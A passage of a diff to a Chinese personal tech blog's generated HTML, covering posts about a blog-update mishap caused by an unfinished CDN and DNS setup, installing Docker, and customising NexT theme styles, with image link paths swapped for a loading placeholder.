 <p><code>ssh -v git@xx.xx.xx.xx</code>在服务器里切到blog.git。。。就一个master呀</p>
-<a href="/2020/03/07/A-painful-experience/7.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>WinSCP连上服务器，看一下文件更新时间？？是今天下午啊！没错呀！</p>
 <p>此时的我意识到了问题的不对劲</p>
-<a href="/2020/03/07/A-painful-experience/8.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>每次在Edge进博客进得都很快，我知道可能是有缓存之类的，但是清除缓存后好像没并没有什么卵用</p>
 <p>于是我打算换一个浏览器进入一下我的博客（  Firefox启动，Google启动</p>
@@ -920,7 +942,7 @@
 <p>我突然想到了我昨天下午搞的骚东西——CDN，好像没搞完就放那不管了</p>
 <p>接下来我发现我的域名解析暂停了没开，CDN暂停了没删</p>
 <p>真相只有一个</p>
-<a href="/2020/03/07/A-painful-experience/9.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>Edge是个 随便！！（好吧，其实是我菜，但是edge浏这个览器连我域名没开解析都能进去的机制属实恶心</p>
 <p>还有就是为啥我拿dl进去是更新的状态，自己的ip却不更新的（我咋觉得还跟上次扫目录有关。。</p>
@@ -949,7 +971,7 @@
 <h5 id="事件记录"><a href="#事件记录" class="headerlink" title="事件记录"></a>事件记录</h5><p>curl太慢（卡着卡着停了）、python2退休（确实不方便）、pip安装不成功</p>
 <p>权限赋予 chmod、教程没啥说的下面挺全</p>
 <p>学习过程再更，（众所周知，安装≈学会）</p>
-<p><a href="/2020/03/02/Docker-learning/t.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload" title></a></p>
 <h5 id="相关网址："><a href="#相关网址：" class="headerlink" title="相关网址："></a>相关网址：</h5><p><a href="https://blog.csdn.net/deng624796905/article/details/86493330" target="_blank" rel="noopener">Docker入门</a></p>
 <p><a href="https://blog.csdn.net/zzq060143/article/details/91050272" target="_blank" rel="noopener">Win10中docker的安装与使用</a></p>
 <p><a href="https://blog.csdn.net/weixin_44725156/article/details/104403204" target="_blank" rel="noopener">Centos7安装Docker Compose(pip方式安装)</a></p>
@@ -998,7 +1020,7 @@
 
 <p>换成淘宝的源会好很多</p>
 <h3 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h3><p>如果想自定义一些自己的样式，而你的版本恰是Next7.X的话（目前最新的Next）。你会发现很多文章中提及的custom文件（可以自由编辑样式的一个文件）没有了。这时你可以在根目录下的source文件下面新建一个_data文件夹，然后在里面新建建一个styles.styl，并在主题配置里设置一下（如下图），这样你就可以在里面加一些自定义的代码了。</p>
-<a href="/2020/02/15/My-first/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 
 
